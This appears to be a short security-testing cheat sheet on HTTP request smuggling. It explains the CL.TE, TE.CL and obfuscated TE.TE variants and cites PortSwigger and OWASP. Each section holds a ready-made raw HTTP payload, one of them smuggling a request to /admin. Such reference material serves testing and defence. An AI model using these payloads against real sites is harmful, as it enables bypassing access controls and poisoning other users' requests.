HTTP request smuggling is a technique for interfering with the way a web site processes sequences of HTTP requests that are received from one or more users. Request smuggling vulnerabilities are often critical in nature, allowing an attacker to bypass security controls, gain unauthorised access to sensitive data, and directly compromise other application users.

# Attacks
## CL.TE
Here, the front-end server uses the `Content-Length` header and the back-end server uses the `Transfer-Encoding` header. 
```
POST / HTTP/1.1
Host: vulnerable-website.com
Content-Length: 35
Transfer-Encoding: chunked

0

GET /404 HTTP/1.1
Foo: x
```

**Expected Result:**
- Back-end stops parsing at the `0` chunk
- Smuggled request remains buffered
- Subsequent legitimate requests are corrupted or return unexpected responses (e.g., 404)


## TE.CL
In a TE.CL scenario, the frontend processes chunked encoding correctly, but the backend relies on `Content-Length`.

```
POST / HTTP/1.1
Host: vulnerable-website.com
Content-Length: 4
Transfer-Encoding: chunked

5c
GET /admin HTTP/1.1
Content-Length: 0

0
```

**Expected Result:**
- Back-end stops early
- Remaining payload is interpreted as a new request
- Unauthorised endpoint access or request poisoning may occur


## Testing for TE.TE (Obfuscated Transfer-Encoding)

If both servers support `Transfer-Encoding`, header obfuscation may cause one parser to ignore it.

Common techniques include:
- Whitespace manipulation
- Header duplication
- Non-standard separators

```
POST / HTTP/1.1
Host: vulnerable-website.com
Content-Length: 44
Transfer-Encoding:\tchunked
Transfer-Encoding: identity

0

GET /404 HTTP/1.1
Foo: bar
```


# References
- [https://portswigger.net/web-security/request-smuggling](https://portswigger.net/web-security/request-smuggling)
- [https://owasp.org/www-project-web-security-testing-guide/latest/4-Web_Application_Security_Testing/07-Input_Validation_Testing/16-Testing_for_HTTP_Request_Smuggling](https://owasp.org/www-project-web-security-testing-guide/latest/4-Web_Application_Security_Testing/07-Input_Validation_Testing/16-Testing_for_HTTP_Request_Smuggling)